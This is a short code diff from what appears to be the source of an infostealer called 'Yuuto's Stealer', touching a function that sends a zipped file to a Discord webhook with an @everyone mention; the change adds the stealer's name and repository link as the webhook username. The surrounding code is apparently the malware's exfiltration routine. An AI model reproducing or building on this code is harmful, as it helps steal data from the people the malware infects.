@@ -224,6 +224,7 @@ const json = async (zipFile) => {
 
   return {
     content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
+    username: 'Yuuto\'s Stealer | https://github.com/JustYuuto/Yuuto-Stealer',
     attachments: [{
       id: 0,
       filename: zipFile?.split(sep)?.pop(),
